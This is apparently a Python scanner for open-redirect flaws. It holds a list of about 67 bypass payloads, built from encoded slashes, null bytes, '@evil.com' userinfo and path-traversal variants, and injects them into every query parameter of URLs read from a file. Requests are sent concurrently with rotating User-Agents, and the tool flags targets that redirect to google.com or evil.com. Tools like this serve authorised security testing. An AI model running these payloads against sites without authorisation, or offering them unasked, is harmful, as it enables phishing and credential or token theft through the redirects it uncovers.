from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
import asyncio
import aiohttp
import random
from scripts.useragent.user_agent import _useragent_list
from colorama import init, Fore

init()
green = Fore.GREEN
reset = Fore.RESET

payloads = [
	"https://google.com",
	"/google.com/%2f.",
	"//google.com",
	"///google.com",
	"%2F%2Fgoogle.com",
	"https:%2F%2Fgoogle.com",
	"file://google.com",
	"\\\\\\\\google.com",
	"https:google.com",
	"https:/google.com",
	"https:/.google.com",
	"https://.google.com",
	"https:://google.com",
	"hxxps://google.com",
	"HTTPS://GOOGLE.COM",
	"https%3A%2F%2Fgoogle.com",
	"https://google.com%2f%2e",
	"https://google.com%2f%2e%2f",
	"https://google.com/",
	"https:///google.com",
	"https://///google.com",
	"https:\\\\\\\\\\\\\\\\google.com",
	"https://\\\\\\\\google.com",
	"https:/\\\\/google.com",
	"https:///google.com/%2f..",
	"https://google.com%2f%2e%2f%2e",
	"https://google.com/.",
	"https://google.com/../",
	"https://google.com/..;/",
	"https://google.com/%2e%2e%2f",
	"https://%67%6f%6f%67%6c%65%2e%63%6f%6d",
	"https://%2567%256f%256f%2567%256c%2565%252e%2563%256f%256d",
	"https://google%252ecom",
	"https://google%2Ecom",
	"https://google%00.com",
	"https://google.com%2500",
	"https://google%252e%2563%256f%256d",
	"https://google%E3%80%82com",
	"https://google%EF%BC%8Ecom",
	"https://google%EF%BD%A1com",
	"https://google.com./",
	"https://google.com%E3%80%82/",
	"https://google.com:443@evil.com",
	"https://google.com:80/",
	"https://google.com:443/",
	"https://google.com:8443/",
	"https://google.com:/",
	"https://google.com:/path",
	"https://google.com:\\t/",
	"https://google.com:\\n/",
	"https://google.com#@evil.com/",
	"https://google.com/?@evil.com/",
	"https://google.com\\./",
	"https://google.com\\/.\\",
	"https://google.com%5c./",
	"https://google.com%5c%2e/",
	"https://google.com%ff/",
	"https://google.com%0a/",
	"https://google.com%20/",
	"https://google.com%2f%2e%2f%2e%2f%2fevil.com",
	"https://google.com/../evil.com/",
	"https://google.com/..%2fevil.com/",
	"https://google.com/..;/evil.com/",
	"https://google.com/..%00/evil.com",
	"https://google.com.evil.com",
	"https://google.com@evil.com",
	"https://google.com%40evil.com",
]

async def redirectx(url, session):
    random_useragent = random.choice(_useragent_list)
    header = {"User-Agent":random_useragent}
    try:
        async with session.get(url, headers=header, allow_redirects=True) as response2:
            urlfinalParsed = urlparse(str(response2.url))
            if urlfinalParsed.netloc == "www.google.com" or urlfinalParsed.netloc == "evil.com":
                print(f"{green}[ VULNERABLLE ] {url}{reset}")
    except Exception:
        pass
async def main(file):
    task = []
    with open(file, 'r') as rf:
        urls = rf.readlines()
    async with aiohttp.ClientSession() as session:
        for url in urls:
            if "=" in url:
                urlp = urlparse(url)
                query = parse_qs(urlp.query)
                for key in query:
                    for payload in payloads:
                        query[key] = [payload]
                        new_query = urlencode(query, doseq=True)
                        new_url = urlunparse(urlp._replace(query=new_query))
                        task.append(redirectx(new_url, session))
        await asyncio.gather(*task)